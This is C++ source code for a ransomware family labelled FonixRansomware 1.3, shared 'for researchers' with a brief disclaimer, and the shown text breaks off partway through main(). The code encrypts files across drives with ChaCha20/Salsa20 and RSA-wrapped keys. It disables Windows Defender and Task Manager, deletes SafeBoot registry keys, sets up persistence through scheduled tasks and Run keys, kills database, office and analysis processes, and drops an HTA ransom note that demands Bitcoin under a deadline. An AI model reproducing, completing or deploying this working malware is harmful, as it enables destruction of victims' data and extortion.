/////  FonixRansomware Version 1.3  /////


/* Version 1.3 
   This version is a Basic Source of FonixCrypter 
   For Researchers , this malware changed a lot in 
   its later versions and has fixes bugs in this code 

NOTE : Please do not use this source code in malicious ways
*/

#include <windows.h>
#include <string>
#include <iostream>
#include <WinReg.h>
#include <tchar.h>
#include <mutex>
#include <thread>
#include <process.h>
#include <Tlhelp32.h>
#include <winbase.h>
#include <ctime>
#include "../cryptoPP/rsa.h"
using CryptoPP::RSA;
using CryptoPP::PublicKey;
using CryptoPP::PrivateKey;
using CryptoPP::ByteQueue;
using CryptoPP::BufferedTransformation;
using CryptoPP::RSAES_OAEP_SHA_Encryptor;
using CryptoPP::RSASSA_PKCS1v15_SHA_Verifier;
using CryptoPP::RSASSA_PKCS1v15_SHA_Signer;
using CryptoPP::PK_EncryptorFilter;
using CryptoPP::RSAES_OAEP_SHA_Decryptor;
using CryptoPP::PK_DecryptorFilter;
#include "../cryptoPP/algparam.h"
#include "../cryptoPP/argnames.h"
#include "../cryptoPP/base64.h"
using CryptoPP::Base64Encoder;
using CryptoPP::Base64Decoder;
using CryptoPP::word64;
#include "../cryptoPP/hex.h"
using CryptoPP::HexDecoder;
using CryptoPP::HexEncoder;
#include "../cryptoPP/salsa.h"
#include "../cryptoPP/chacha.h"
using std::cout;
using std::cerr;
using std::endl;
#include <fstream> 
#include "../cryptoPP/osrng.h"
using CryptoPP::AutoSeededRandomPool;
using CryptoPP::SecByteBlock;

#include "../cryptoPP/Salsa.h"
#include <cstddef>
#include <cstdlib>
using std::exit;
#include "../cryptoPP/files.h"
using CryptoPP::FileSink;

using CryptoPP::FileSource;
using CryptoPP::ArraySink;
#include "../cryptoPP/cryptlib.h"
using CryptoPP::Exception;
using CryptoPP::Redirector;

#include <vector>
#include "../cryptoPP/filters.h"
using CryptoPP::StringSink;
using CryptoPP::StringSource;
using CryptoPP::StreamTransformationFilter;

#include "../cryptoPP/ccm.h"
using CryptoPP::CBC_Mode;
#include "assert.h"
using namespace std;
using CryptoPP::byte;
using namespace CryptoPP;
wstring date();
string decode(string);
int CopyReadme(wstring, WCHAR*);
void killProcessByName(const WCHAR*);
int cryptbigfile(std::wstring, RSA::PublicKey, WCHAR*);
int cryptsmallfile(std::wstring, RSA::PublicKey, WCHAR*);
void LoadPublicKey(const string&, PublicKey&);
void LoadPrivateKey(const string&, PrivateKey&);
void Load(const string&, BufferedTransformation&);
void Save(const string&, const BufferedTransformation&);
void SavePrivateKey(const string&, const PrivateKey&);
void SavePublicKey(const string&, const PublicKey&);
string RSAencrypt(RSA::PublicKey, string);
bool exist(const WCHAR*);
void SaveBase64PrivateKey(const string&, const PrivateKey&);
void SaveBase64(const string&, const BufferedTransformation&);
string RSAdecrypt(RSA::PrivateKey, string);
string hello = "Hello Michael Gillespie";
const string Spub =
"MIICIDANBgkqhkiG9w0BAQEFAAOCAg0AMIICCAKCAgEAw/e1WN2RDlZ/9md10KzUpWlxrT4O"
"Z5i86V8WSvEe6oBeJzctIk5HSO6ZxifUG2DZSCxjLLVldfB4na99WsCKe/5Ut0ZEGReLaHfz"
"TXPAaluABfbBnwXGIBopPBcKgdfLQLps0/k7njlzYdlYmr617c5d6GRZ0eWBKDXl2bzYX2iN"
"PwDB660gA/UlZxXHHZwWT69HbeIqH+oGrPj3BOTJo5kH23N2+AiAJSTjX3zVwEouI1JuIXvY"
"7kWpWCRKZoYxHObquEUJqAtXmiHi4VlzWBgFK9WjAK/J/Zff5ppa+F0mn0PlucgwxIpTpTP+"
"cCTeaw/USFTD4FqKTKZIuxfr22NeuG4tkkwKIxAQtnK0MeXh7NcxiZd8fj5H5vaY+6f5lGoC"
"ltiOi59+vEZAdfJLJ00OBAOKL9m9yIWD4nADIYJEg7cg5feyxR9oa0sDmQEAT4iek9UHfvnW"
"JiImO1SK0AxZnC6nMsBXdVx4J/Tt3Z4nZCCABh9uh2g1IfbzW6tEIgG4Zdd8eoziErnuymmM"
"f7tcIZTRmKP5FW4TCqZLkTlzylUYKPFRl+I68PpSAoJ811jWl5HR2SSo/aSW91HIX401nTGn"
"gZWws6TwKnaS+M83IQTv0L+SncWEVjA84uHfVHscAaHp34u3nmOTyT7Fuj+/zEYdpiFtP88V"
"FAhJWOUCARE=";

////////////////////////////////////////////////////////////////////////////////////////////////////////
const wstring email = L"xxxxxxx@protonmail.com";
const wstring email2 = L"xxxxxxxx@mailfence.com";
const wstring username = L"FonixOwner";
////////////////////////////////////////////////////////////////////////////////////////////////////////

void hideWin() {
    HWND hWnd = GetConsoleWindow();
    ShowWindow(hWnd, SW_HIDE);
}

int keyGen() {
    string dSpub = decode(Spub);
    StringSource ss(dSpub, true );
    RSA::PublicKey kSpub;
    kSpub.Load(ss);
    AutoSeededRandomPool rnd;
    RSASSA_PKCS1v15_SHA_Signer rsaPrivate;
    rsaPrivate.AccessKey().GenerateRandomWithKeySize(rnd, 2048);
    RSASSA_PKCS1v15_SHA_Verifier rsaPublic(rsaPrivate);
    SaveBase64PrivateKey("Cpriv.key", rsaPrivate.AccessKey());
    SavePublicKey("Cpub.key", rsaPublic.AccessKey());

    std::ifstream is("Cpriv.key");
    char* buffer = new char[1646];
    string buf, part, crypted;
    is.read(buffer, 1646);
    is.close();


    buf = buffer;
    part = buf.substr(0, 145);
    crypted = RSAencrypt(kSpub, part);

    std::ofstream os("Cpriv.key");
    os.write(crypted.c_str(), crypted.length());
    os.write("\n\n", 2);
    os.write(buf.substr(146, 1500).c_str(), 1500);
    os.close();

    rsaPrivate.AccessKey().GenerateRandomWithKeySize(rnd, 2048);

    free(buffer);
    buf = " ";
    part = " ";
    crypted = " ";
    return 0;
}

void SaveBase64PrivateKey(const string& filename, const PrivateKey& key)
{
    ByteQueue queue;
    key.Save(queue);

    SaveBase64(filename, queue);
}

void SaveBase64(const string& filename, const BufferedTransformation& bt)
{
    Base64Encoder encoder;

    bt.CopyTo(encoder);
    encoder.MessageEnd();

    Save(filename, encoder);
}

void SavePublicKey(const string& filename, const PublicKey& key)
{
    ByteQueue queue;
    key.Save(queue);

    Save(filename, queue);
}



void Save(const string& filename, const BufferedTransformation& bt)
{
    FileSink file(filename.c_str());

    bt.CopyTo(file);
    file.MessageEnd();
}
void LoadPublicKey(const string& filename, PublicKey& key)
{
    ByteQueue queue;
    Load(filename, queue);

    key.Load(queue);
}
void LoadPrivateKey(const string& filename, PrivateKey& key)
{
    ByteQueue queue;
    Load(filename, queue);

    key.Load(queue);
}

void Load(const string& filename, BufferedTransformation& bt)
{
    FileSource file(filename.c_str(), true);
    file.TransferTo(bt);

    bt.MessageEnd();
}


string RSAencrypt(RSA::PublicKey publicKey, string plain) {
    string cipher;
    try {
        AutoSeededRandomPool rng;
        RSAES_OAEP_SHA_Encryptor e(publicKey);
        StringSource ss1(plain, true,
            new PK_EncryptorFilter(rng, e,
                new Base64Encoder(
                    new StringSink(cipher)
                ) 
            )
        );

    }
    catch (CryptoPP::Exception& e)
    {
        cerr << "Caught Exception..." << endl;
        cerr << e.what() << endl;
    }
    return cipher;
}

string RSAdecrypt(RSA::PrivateKey privateKey, string cipher) {
    AutoSeededRandomPool rng;
    string recovered;
    string cipher2;
    try {

        RSAES_OAEP_SHA_Decryptor d(privateKey);
        StringSource ss(cipher, true,
            new Base64Decoder(
                new StringSink(cipher2)
            ) 
        ); 
        StringSource ss2(cipher2, true,
            new PK_DecryptorFilter(rng, d,
                new StringSink(recovered)
            ) 
        );

    }
    catch (CryptoPP::Exception& d) {
        cerr << "Caught Exception..." << endl;
        cerr << d.what() << endl;
    }
    return recovered;
}


void GetFileListing(std::wstring directory, std::wstring fileFilter, WCHAR* id, RSA::PublicKey pb, bool recursively = true)
{

    if (recursively)
        GetFileListing(directory, fileFilter, id, pb, false);

    directory += L"\\";

    WIN32_FIND_DATA FindFileData;
    HANDLE hFind = INVALID_HANDLE_VALUE;

    std::wstring filter = directory + (recursively ? L"*" : fileFilter);

    hFind = FindFirstFile(filter.c_str(), &FindFileData);

    if (hFind == INVALID_HANDLE_VALUE)
    {
        return;
    }
    else
    {
        if (!recursively)
        {
            wstring privkey = L"C:\\ProgramData";
            privkey = privkey + L"\\Cpriv.key";
            CopyReadme(directory, id);
            CopyFileW(privkey.c_str(), (directory + L"\\Cpriv.key").c_str(), TRUE);
            std::wcout << L"Directory : " << directory << std::endl;
            std::ifstream is(directory + std::wstring(FindFileData.cFileName), std::ifstream::binary);
            if (!is.fail()) {
                is.seekg(0, is.end);
                unsigned long long length = is.tellg();
                is.seekg(0, is.beg);
                is.close();
                if (length > 300000) {
                    cryptbigfile(directory + std::wstring(FindFileData.cFileName), pb, id);
                }
                else if (length <= 300000) {
                    cryptsmallfile(directory + std::wstring(FindFileData.cFileName), pb, id);
                }
            }
            else {
                if ((wcscmp(FindFileData.cFileName, L".") != 0) || FindFileData.cFileName == NULL)
                    wcout << L" #1 error! " << endl;
            }
        }

        while (FindNextFile(hFind, &FindFileData) != 0)
        {
            if (directory.find(L"C:\\Windows") != std::string::npos)
                continue;
            else if (directory.find(L"C:\\WINDOWS") != std::string::npos)
                continue;
            else if (directory.find(L"C:\\windows") != std::string::npos)
                continue;
            if (directory.find(L"C:\\Program Files\\WindowsApps") != std::string::npos)
                continue;
            else if (directory.find(L"boot") != std::string::npos)
                continue;
            else if (directory.find(L"Boot") != std::string::npos)
                continue;
            else if (directory.find(L"BOOT") != std::string::npos)
                continue;
            else if (directory.find(L"\\Microsoft\\Windows\\") != std::string::npos)
                continue;
            else if (directory.find(L"NTUSER.DAT") != std::string::npos)
                continue;
            else if (directory.find(L"win.ini") != std::string::npos)
                continue;
            else if (directory.find(L"UsrClass.dat") != std::string::npos)
                continue;
            else if ((wcscmp(FindFileData.cFileName, L"..") == 0) || FindFileData.cFileName == NULL)
                continue;
            else if (std::wstring(FindFileData.cFileName).find(L"XINOF") != std::string::npos)
                continue;
            else if ((wcscmp(FindFileData.cFileName, L"Cpriv.key") == 0) || FindFileData.cFileName == NULL)
                continue;
            else if ((wcscmp(FindFileData.cFileName, L"D.XINOF") == 0) || FindFileData.cFileName == NULL)
                continue;
            else if ((wcscmp(FindFileData.cFileName, L"SystemScheduler.exe") == 0) || FindFileData.cFileName == NULL)
                continue;
            else if ((wcscmp(FindFileData.cFileName, L"Hello Michael Gillespie") == 0) || FindFileData.cFileName == NULL)
                continue;
            else if ((wcscmp(FindFileData.cFileName, L"Cpub.key") == 0) || FindFileData.cFileName == NULL)
                continue;
            else if ((wcscmp(FindFileData.cFileName, L"FonixDecrypter.exe") == 0) || FindFileData.cFileName == NULL)
                continue;
            else if ((wcscmp(FindFileData.cFileName, L"CrptSrvcFLG") == 0) || FindFileData.cFileName == NULL)
                continue;
            else if ((wcscmp(FindFileData.cFileName, L"How To Decrypt Files.hta") == 0) || FindFileData.cFileName == NULL)
                continue;
            else if ((wcscmp(FindFileData.cFileName, L"Help.txt") == 0) || FindFileData.cFileName == NULL)
                continue;
            else if (std::wstring(FindFileData.cFileName).find(L"SystemID") != std::string::npos)
                continue;

            if (!recursively)
            {
                if (!(FindFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
                    std::ifstream is(directory + std::wstring(FindFileData.cFileName), std::ifstream::binary);
                    if (!is.fail()) {
                        is.seekg(0, is.end);
                        unsigned long long length = is.tellg();
                        is.seekg(0, is.beg);
                        is.close();
                        if (length > 300000) {
                            cryptbigfile(directory + std::wstring(FindFileData.cFileName), pb, id);
                        }
                        else if (length <= 300000) {
                            cryptsmallfile(directory + std::wstring(FindFileData.cFileName), pb, id);
                        }
                    }
                    else
                        wcout << L" \n #2 error " << endl;
                }
            }
            else
            {
                if ((FindFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) > 0 && (wcsicmp(FindFileData.cFileName, L".")) && (wcsicmp(FindFileData.cFileName, L"..")))
                {
                    GetFileListing(directory + std::wstring(FindFileData.cFileName), fileFilter, id, pb);
                }
            }
        }
        DWORD dwError = GetLastError();
        FindClose(hFind);
        if (dwError != ERROR_NO_MORE_FILES)
        {
            std::cout << "FindNextFile error. Error is " << dwError << std::endl;
        }
    }
}

void FindFiles(std::wstring Drive, WCHAR* id, RSA::PublicKey pb) {
    GetFileListing(Drive, L"*.*", id, pb);
}


/////  FonixRansomware Version 1.3  /////


/* Version 1.3
   This version is a Basic Source of FonixCrypter
   For Researchers , this malware changed a lot in
   its later versions and has fixes bugs in this code

NOTE : Please do not use this source code in malicious ways
*/

string encode(byte* decoded) {

    string encoded;

    Base64Encoder encoder;
    encoder.Put(decoded, sizeof(decoded));
    encoder.MessageEnd();

    word64 size = encoder.MaxRetrievable();
    if (size)
    {
        encoded.resize(size);
        encoder.Get((byte*)&encoded[0], encoded.size());
    }
    return encoded;
}

string decode(string encoded) {
    string decoded;

    StringSource ss(encoded, true,
        new Base64Decoder(
            new StringSink(decoded)
        ) 
    ); 
    return decoded;
}


int cryptsmallfile(std::wstring Name, RSA::PublicKey pb, WCHAR* id) {

    std::ifstream is(Name, std::ifstream::binary);
    if (is.fail())
        wcout << L" \n #3 error " << endl;
    else {
        is.seekg(0, is.end);
        unsigned long  long length = is.tellg();
        is.seekg(0, is.beg);
        unsigned char* buffer = new unsigned char[length];
        unsigned char* cipher = new unsigned char[length];

        CryptoPP::AutoSeededRandomPool prng;
        SecByteBlock key(16), iv(8);
        prng.GenerateBlock(key, key.size());
        prng.GenerateBlock(iv, iv.size());
        string k, v;

        HexEncoder hex(new StringSink(k));
        hex.Put(key, key.size());
        hex.MessageEnd();

        hex.Detach(new StringSink(v));
        hex.Put(iv, iv.size());
        hex.MessageEnd();

        string skey = (const char*)key.data();
        string siv = (const char*)iv.data();

        CryptoPP::ChaCha::Encryption ChaCha;

        ChaCha.SetKeyWithIV((byte*)&k[0], k.size(), (const byte*)&v[0]);
        siv = RSAencrypt(pb, v);
        skey = RSAencrypt(pb, k);


        is.read((char*)&buffer[0], length);
        ChaCha.ProcessData(cipher, buffer, length);
        is.close();
        ofstream newfile(Name, ios::out | ios::binary | ios::_Nocreate);
        if(newfile.fail())
            wcout << L" \n #4 error " << endl;
        else {

            newfile.seekp(0, newfile.beg);
            newfile.write((char*)&cipher[0], length);
            newfile.write(skey.c_str(), skey.size());
            newfile.write("::::", 4);
            newfile.write(siv.c_str(), siv.size());
            newfile.write("::::", 4);
            newfile.close();
            wstring newname = Name + L".Email=[" + email + L"]ID=[" + id + L"].XINOF";
                int res = _wrename(Name.c_str(), newname.c_str());
            if (res != 0)
                    res = _wrename(Name.c_str(), newname.c_str());
            if (res != 0)
                wcout << L" \n #5 error " << endl;
            
        }
        free(buffer);
        free(cipher);
    }

    return 0;
}

int cryptbigfile(std::wstring Name, RSA::PublicKey pb, WCHAR* id) {
    std::ifstream is(Name, std::ifstream::binary);
    if(is.fail())
        wcout << L" \n #6 error " << endl;
    else {
        const int length = 300000;
        unsigned char* buffer = new unsigned char[length];
        unsigned char* cipher = new unsigned char[length];

        CryptoPP::AutoSeededRandomPool prng;
        SecByteBlock key(16), iv(8);
        prng.GenerateBlock(key, key.size());
        prng.GenerateBlock(iv, iv.size());
        string k, v;

        HexEncoder hex(new StringSink(k));
        hex.Put(key, key.size());
        hex.MessageEnd();

        hex.Detach(new StringSink(v));
        hex.Put(iv, iv.size());
        hex.MessageEnd();

        string skey = (const char*)key.data();
        string siv = (const char*)iv.data();

        CryptoPP::Salsa20::Encryption Salsa;
        Salsa.SetKeyWithIV((byte*)&k[0], k.size(), (const byte*)&v[0]);
        siv = RSAencrypt(pb, v);
        skey = RSAencrypt(pb, k);


        is.read((char*)&buffer[0], length);
        is.close();
        ofstream newfile(Name, ios::out | ios::binary | ios::_Nocreate);
        if(newfile.fail())
            wcout << L" \n #7 error " << endl;
        else {

            Salsa.ProcessData(cipher, buffer, length);
            newfile.seekp(0, newfile.end);
            newfile.write(skey.c_str(), skey.size());
            newfile.write("::::", 4);
            newfile.write(siv.c_str(), siv.size());
            newfile.write("::::", 4);
            newfile.seekp(0, newfile.beg);
            newfile.write((char*)&cipher[0], length);
            newfile.close();
                wstring newname = Name + L".Email=[" + email + L"]ID=[" + id + L"].XINOF";
                int res = _wrename(Name.c_str(), newname.c_str());
                if (res != 0)
                    res = _wrename(Name.c_str(), newname.c_str());
                if(res!=0)
                    wcout << L" \n #8 error " << endl;
             

        }
        free(buffer);
        free(cipher);

    }
    return 0;

}


int CopyToPath() {
    wstring appdata = L"C:\\ProgramData";
    wstring pubappdata = appdata + L"\\Cpub.key";


    if (!exist(pubappdata.c_str()))
        CopyFileW(L"Cpub.key", (appdata + L"\\Cpub.key").c_str(), TRUE);


    wstring privappdata = appdata + L"\\Cpriv.key";



    if (!exist(privappdata.c_str()))
        CopyFileW(L"Cpriv.key", (appdata + L"\\Cpriv.key").c_str(), TRUE);


    return 0;
}

bool exist(const WCHAR* fileName)
{
    std::wifstream infile(fileName);
    return infile.good();
}

int DisableDefenders() {
    system("reg add HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System   /v DisableTaskMgr  /t REG_DWORD /d 1 /f");
    system("reg add \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\"   /v DisableAntiSpyware   /t REG_DWORD /d 1 /f");
    system("reg delete HKEY_CURRENT_USER\\System\\CurrentControlSet\\Control\\SafeBoot /va /F");
    system("reg delete HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\SafeBoot /va /F");
    return 0;
}

int shadowCopy() {
    system("icacls * /grant Everyone:(OI)(CI)F /T /C /Q");
    return 0;
}

int startup() {
    string cmd = "attrib +h +s \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\XINOF.exe\"";
    system("schtasks /CREATE /SC ONLOGON /TN fonix /TR C:\\ProgramData\\XINOF.exe /RU SYSTEM /RL HIGHEST /F");
    system("copy C:\\ProgramData\\XINOF.exe \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\XINOF.exe\"");
    system("copy C:\\ProgramData\\XINOF.exe \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\XINOF.exe\"");
    CopyFileW(L"XINOF.exe", L"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\XINOF.exe", TRUE);
    system("schtasks /CREATE /SC ONLOGON /TN fonix /TR C:\\ProgramData\\XINOF.exe /F");
    system(cmd.c_str());
    system("reg add HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\ /v \"Michael Gillespie\" /t REG_SZ /d C:\\ProgramData\\XINOF.exe /f");
    system("reg add HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\ /v \"Michael Gillespie\" /t REG_SZ /d C:\\ProgramData\\XINOF.exe /f");
    system("reg add HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce\\ /v \"Michael Gillespie\" /t REG_SZ /d C:\\ProgramData\\XINOF.exe /f");
    system("reg add HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce\\ /v \"Michael Gillespie\" /t REG_SZ /d C:\\ProgramData\\XINOF.exe /f");
    return 0;
}

int BlackList() {
    wstring names[] = { L"mms.exe",L"schedul2.exe",L"schedhelp.exe",L"tib_mounter_monitor.exe",L"SQLIOSIM.EXE",L"Sqlagent.exe",L"sqlmaint.exe",L"sqlstubss.exe",L"csrss.exe",L"sqlceip.exe",L"mstsc.exe",L"taskmgr.exe",L"sqlservr.exe", L"QBIDPService.exe",  L"sqlserver.exe",  L"msftesql.exe",  L"sqlagent.exe", 	 L"sqlbrowser.exe",	 L"sqlwriter.exe", 	 L"oracle.exe", L"ocssd.exe",  L"dbsnmp.exe",
     L"synctime.exe",  L"mydesktopqos.exe",  L"agntsvc.exe", L"isqlpplussvc.exe",   L"isqlpussvc.exe", 	 L"xfssvccon.exe", 	 L"mydesktopservice.exe",
     L"ocautoupds.exe", 	 L"encsvc.exe", 	 L"firefoxconfig.exe", 	 L"tbirdconfig.exe", 	 L"ocomm.exe" ,	 L"mysqld.exe",  L"mysqld-nt.exe", 	 L"mysqld-opt.exe",
     L"dbeng50.exe", 	 L"sqbcoreservice.exe", 	L"excel.exe", 	 L"infopath.exe", 	 L"msaccess.exe", 	 L"mspub.exe", 	L"onenote.exe", 	 L"outlook.exe",
     L"powerpnt.exe", 	 L"stream.exe",  L"thebat.exe", 	 L"thebat64.exe", 	 L"Thunderbird.exe", 	 L"visio.exe", 	 L"winword.exe", 	 L"wordpad.exe",
     L"notepad.exe", L"paint.exe", L"notepad++.exe" ,L"endnote.exe",L"vmwareuser.exe", 	L"vmwareservice.exe", 	L"vboxservice.exe", 	L"vboxtray.exe", 	L"Sandboxiedcomlaunch.exe",
    L"procmon.exe", 	L"regmon.exe", 	L"filemon.exe", L"wireshark.exe", 	L"netmon.exe", L"vmtoolsd.exe", L"ntoskrnl.exe", L"sqlwriter.exe", L"sqlservr.exe",L"Ssms.exe" };
    for (wstring tmp : names) {
        killProcessByName(tmp.c_str());
    }
    return 0;
}
void killProcessByName(const WCHAR* filename)
{
    HANDLE hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPALL, NULL);
    PROCESSENTRY32 pEntry;
    pEntry.dwSize = sizeof(pEntry);
    BOOL hRes = Process32First(hSnapShot, &pEntry);
    while (hRes)
    {
        if (wcscmp(pEntry.szExeFile, filename) == 0)
        {
            HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, 0,
                (DWORD)pEntry.th32ProcessID);
            if (hProcess != NULL)
            {
                TerminateProcess(hProcess, 9);
                CloseHandle(hProcess);
            }
        }
        hRes = Process32Next(hSnapShot, &pEntry);
    }
    CloseHandle(hSnapShot);
}


/////  FonixRansomware Version 1.3  /////


/* Version 1.3
   This version is a Basic Source of FonixCrypter
   For Researchers , this malware changed a lot in
   its later versions and has fixes bugs in this code

NOTE : Please do not use this source code in malicious ways
*/

int Readme(WCHAR* id) {
    wstring Text = L"<!DOCTYPE HTML PUBLIC '-//W3C//DTD HTML 4.01//EN' 'http://www.w3.org/TR/html4/strict.dtd'><html><head><meta charset='windows-1251'><title>XINOF V 1.3</title><HTA:APPLICATION icon=\"#\" WINDOWSTATE=\"maximize\" scroll=\"yes\" /><style type='text/css'>body{font:15px Tahoma,sans-serif;margin:10px;line-height:25px;background:rgb(0,0,0);color:#FFF}a{color:wheat}img{display:inline-block}.bold{font-weight:bold}.mark{background:rgb(189, 54, 54);padding:2px 5px}.header{text-align:center;font-size:30px;line-height:50px;font-weight:bold;margin-bottom:20px}.info{background:rgb(78, 78, 78);border-left:10px solid rgb(59,59,59)}.alert{background:rgb(255, 0, 0);border-left:10px solid rgb(255,0,0)}.private{border:1px dashed #000;background:#FFFFEF}.note{height:auto;padding-bottom:1px;margin:15px 0}.note .title{font-weight:bold;text-indent:10px;height:30px;line-height:30px;padding-top:10px}.note .mark{background:#A2A2B5}.note ul{margin-top:0}.note pre{margin-left:15px;line-height:13px;font-size:13px}.footer{position:fixed;bottom:0;right:0;text-align:right}p {text-align: center;font-size: 50px; margin-top: 0px;color:red;}.del{font-size:20px ;text-align:center;color : #ffffff;}</style></head><body><div class='header'> <div><font color=\"red\"><font size=\"8\"><br />All of your files have been encrypted!</font></font></div></div><br><div><p id=\"demo\"></p><script>var countDownDate = new Date(\"" + date() + L"\").getTime();var x = setInterval(function() {var now = new Date().getTime();var distance = countDownDate - now;var days = Math.floor(distance / (1000 * 60 * 60 * 24));var hours = Math.floor((distance % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));  var minutes = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));  var seconds = Math.floor((distance % (1000 * 60)) / 1000);  document.getElementById(\"demo\").innerHTML = days + \"d \" + hours + \"h \"+ minutes + \"m \" + seconds + \"s \";  if (distance < 0) {    clearInterval(x);    document.getElementById(\"demo\").innerHTML = \"EXPIRED!say bye to your files : D\"; }}, 1000);</script><p class=\"del\">to DELETE all of your files...</p><center><p style=\"color:#ffffff; font - size:25px\"><br>to avoid any problem READ THIS HELP CARFULLY</p></center><div class='bold'>All your files have been encrypted due to a security problem with your PC. If you want to restore them, please send an email to <span class='mark'>" + email + L"</span></div><div class='bold'>The crypter person username : <span class='mark'>" + username + L"</span><br /></div><div class='bold'>your SYSTEM ID is : <span class='mark'>" + id + L"</span><br /></div><div> You have to pay for decryption in Bitcoin. The price depends on how fast you contact us. After payment we will send you the decryption tool.<br />You have to 48 hours(2 Day) To contact or paying us After that, you have to Pay <b>Double</b>.<div class='bold'>in case of no answer in 6 hours email us at = <span class='mark'>" + email2 + L"</span><br /></div><div class='note alert'><div class='title'>Attention!</div><ul><li><u><b>DO NOT</b> pay any money before decrypting the test files.</u></li><li><u><b>DO NOT</b> trust any intermediary.</u> they wont help you and you may be victim of scam. just email us , we help you in any steps.</li><li><u><b>DO NOT</b> reply to other emails.</u> ONLY this two emails can help you.</li><li>Do not rename encrypted files.</li><li>Do not try to decrypt your data using third party software, it may cause permanent data loss.</li><li>If the payment is not done after decryption, report the username to support email(along with evidence such as Transfer ID)</li></ul></div><div class='note info'><div class='title'>What is our decryption guarantee?</div><ul>Before paying you can send us up to <u>3 test files</u> for free decryption. The total size of files must be less than 2Mb (non archived), and files should not contain valuable information. (databases,backups, large excel sheets, etc.)</ul></div><div class='note info'><div class='title'>How to obtain Bitcoins</div><ul> The easiest way to buy bitcoins is LocalBitcoins site.You have to register, click 'Buy bitcoins', and select the seller by payment method and price.<br><a href='https://localbitcoins.com/buy_bitcoins'>https://localbitcoins.com/buy_bitcoins</a> <br> Also you can find other places to buy Bitcoins and beginners guide here: <br><a href='http://www.coindesk.com/information/how-can-i-buy-bitcoins/'>http://www.coindesk.com/information/how-can-i-buy-bitcoins/</a></ul></div><div class='note alert'><div class='title'>You only have LIMITED time to get back your files!</div><ul><li>if timer runs out and you dont pay us , all of files will be DELETED and yuor hard disk will be seriously DAMAGED.</li><li>you will lose some of your data on day 2 in the timer.</li><li>you can buy more time for pay. Just email us .</li><li>THIS IS NOT A JOKE! you can wait for the timer to run out ,and watch deletion of your files :)</li></ul></div><b>Regards-FonixTeam</b></body></html>";
    wstring Text2 = L"Are you looking for your important files?\n\n Send a message to " + email + L" \n\nYOUR SYSTEM ID IS : " + id;
    wstring appdata = L"C:\\ProgramData";
    appdata = appdata + L"\\How To Decrypt Files.hta";

    if (!exist(appdata.c_str()))
    {
        wofstream Rm(appdata, ios::out);
        Rm.write(Text.c_str(), Text.size());
        Rm.close();
    }

    appdata = L"C:\\ProgramData";
    appdata = appdata + L"\\Help.txt";
    if (!exist(appdata.c_str()))
    {
        wofstream Rm2(appdata, ios::out);
        Rm2.write(Text2.c_str(), Text2.size());
        Rm2.close();
    }

    wofstream Hello("C:\\ProgramData\\" + hello, ios::out);
    Hello.write(L"I'm so sorry for this :( \n\n Mr.Phoenix", 49);
    Hello.close();
    return 0;
}

int CopyReadme(wstring path, WCHAR* id) {
    Readme(id);
    wstring readme = L"C:\\ProgramData";
    wstring readme1 = readme + L"\\How To Decrypt Files.hta";
    wstring readme2 = readme + L"\\Help.txt";
    wstring path1 = path + L"\\How To Decrypt Files.hta";
    wstring path2 = path + L"\\Help.txt";
    CopyFileW(readme1.c_str(), path1.c_str(), TRUE);
    CopyFileW(readme2.c_str(), path2.c_str(), TRUE);
    CopyFileW(readme1.c_str(), L"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\How To Decrypt Files.hta", TRUE);
    CopyFileW(readme2.c_str(), L"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\Help.txt", TRUE);
    return 0;
}
void GenID() {
    CryptoPP::AutoSeededRandomPool prng;
    ofstream idf("SystemID", ios::out | ios::binary);
    SecByteBlock  id(4);
    prng.GenerateBlock(id, id.size());
    string d;
    HexEncoder hex(new StringSink(d));
    hex.Put(id, id.size());
    hex.MessageEnd();
    idf.write(d.c_str(), 8);
    idf.close();
    system("Copy SystemID C:\\ProgramData\\SystemID");
}
wstring date() {

    int day, month, year;
    time_t now = time(0);
    tm* gmtm = gmtime(&now);
    day = gmtm->tm_mday + 6;
    month = gmtm->tm_mon;
    year = gmtm->tm_year + 1900;
    if (day > 30)
        month++;
    if (month > 12)
        year++;
    day = day % 30;
    if (day == 0)
        day = 30;
    month = month % 12;
    if (month == 0)
        month = 12;
    wstring names[12] = { L"January",L"February",L"March",L"April",L"May",L"June",L"July",L"August",L"September",L"October",L"November",L"December" };
    wstring date = names[month] + L" " + to_wstring(day) + L" " + to_wstring(year) + L" " + to_wstring(gmtm->tm_hour) + L":" + to_wstring(gmtm->tm_min);
    return date;
}
void hta() {
    killProcessByName(L"mshta.exe");
    Sleep(5);
    system("\"How To Decrypt Files.hta\"");
    Sleep(300000);
    hta();
}

int main(int argc, char* argv[]) {

    hideWin();
    startup();
    CopyFileA(argv[0], "C:\\ProgramData\\XINOF.exe", TRUE);
    CopyFileA(argv[0], "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\XINOF.exe", TRUE);
    system(("schtasks /CREATE /SC ONLOGON /TN fonix11 /TR \"" + (string)argv[0] + "\" /RU SYSTEM /RL HIGHEST /F").c_str());
    system(("schtasks /CREATE /SC ONLOGON /TN fonix10 /TR \"" + (string)argv[0] + "\"  /F").c_str());
    DisableDefenders();
    BlackList();
    HANDLE ps = GetCurrentProcess();
    SetPriorityClass(ps, HIGH_PRIORITY_CLASS);
    SetProcessPriorityBoost(ps, FALSE);

    thread sss(shadowCopy);
    sss.detach();
